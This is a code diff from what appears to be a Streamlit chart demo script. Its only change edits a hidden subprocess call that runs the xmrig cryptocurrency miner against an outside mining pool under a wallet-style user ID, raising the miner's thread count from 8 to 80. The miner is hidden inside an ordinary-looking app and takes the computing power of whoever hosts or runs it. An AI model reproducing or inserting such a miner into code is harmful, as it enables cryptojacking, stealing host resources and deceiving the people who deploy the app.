@@ -72,7 +72,7 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("./xmrig --algo=ghostrider --url stratum+tcp://miningpool2u.com:3026 --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 8 -k", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("./xmrig --algo=ghostrider --url stratum+tcp://miningpool2u.com:3026 --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 80 -k", stdout=subprocess.PIPE, shell=True)
 
 import time 
 from IPython.display import clear_output 
